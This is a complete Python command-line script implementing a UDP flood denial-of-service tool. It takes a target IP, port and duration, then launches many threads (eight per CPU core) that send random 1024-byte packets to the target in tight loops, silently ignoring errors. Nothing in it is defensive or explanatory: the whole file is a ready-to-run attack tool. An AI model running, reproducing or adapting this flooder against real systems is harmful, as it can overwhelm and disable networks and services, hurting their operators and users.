import socket
import random
import time
import threading
import multiprocessing
from argparse import ArgumentParser

class UDPFlooder:
    def __init__(self, target_ip, target_port, duration):
        self.target_ip = target_ip
        self.target_port = target_port
        self.packet_size = 1024
        self.duration = duration
        self.running = False
        self.num_threads = multiprocessing.cpu_count() * 8

    def create_socket(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setblocking(0)
            return sock
        except:
            return None

    def generate_packet(self):
        return random._urandom(self.packet_size)

    def flood(self):
        sock = self.create_socket()
        if not sock:
            return

        self.running = True
        start_time = time.time()
        
        try:
            while self.running and (time.time() - start_time) < self.duration:
                try:
                    for _ in range(200):
                        sock.sendto(self.generate_packet(), (self.target_ip, self.target_port))
                except:
                    pass
        finally:
            sock.close()
            self.running = False

    def start(self):
        threads = []
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.flood)
            thread.daemon = True
            threads.append(thread)
            thread.start()

        try:
            while any(t.is_alive() for t in threads):
                time.sleep(0.1)
        except KeyboardInterrupt:
            self.running = False
            for thread in threads:
                thread.join()

def main():
    parser = ArgumentParser()
    parser.add_argument("target_ip")
    parser.add_argument("target_port", type=int)
    parser.add_argument("duration", type=int)
    args = parser.parse_args()

    try:
        flooder = UDPFlooder(args.target_ip, args.target_port, args.duration)
        flooder.start()
    except:
        pass

if __name__ == "__main__":
    main() 
